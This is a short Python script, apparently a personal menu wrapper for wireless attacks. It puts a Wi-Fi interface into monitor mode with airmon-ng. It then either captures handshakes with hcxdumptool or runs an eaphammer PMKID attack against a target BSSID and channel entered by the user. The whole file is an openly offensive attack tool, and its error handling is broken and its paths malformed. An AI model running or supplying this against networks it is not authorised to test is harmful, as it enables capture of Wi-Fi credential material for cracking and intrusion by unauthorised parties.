import os
import sys
from termcolor import colored


def attack():
	q1 = input('Have You Performed A "check kill" And A "start wlan0" Already (y/n):\n> ')
	if q1 == 'y':
		pass
	elif q1 == 'n':
		kill = 'sudo airmon-ng check kill'
		start = 'sudo airmon-ng start wlan0'
		os.system(kill)
		os.system(start)
	print(colored('[a] hcxdumptool\n[b] eaphammer', 'yellow'))
	atk = input('> ')
	if atk == 'a':
		hcxdumptool = 'hcxdumptool -w /home/d0c0b/Desktop/attack.pcap -i wlan0mon'
		os.system(hcxdumptool)
		print(colored('[+] Finished', 'green'))

	elif atk == 'b':
		try:
			bssID = input('What Is The Target BSSID:\n> ')
			chnl = int(input('What Channel Is Your Target On:\n> '))
			exe = f'bash ./home/d0c0b/Packages/GHRepo/eaphammer/eaphammer --pmkid --interface wlan0 --channel {chnl} --bssid {bssID}'
			os.system(exe)

		except:
			bssID = int(input('What Is The Target BSSID:\n> '))
			chnl = int(input('What Channel Is Your Target On:\n> '))
			exe = f'bash ./home/d0c0b/Packages/GHRepo/eaphammer/eaphammer --pmkid --interface wlan0 --channel {chnl} --bssid {bssID}'
			os.system(exe)

		else:
			print(colored('ERROR OCCURED', 'red'))


	else:
		print(colored('ERROR OCCURRED', 'red'))
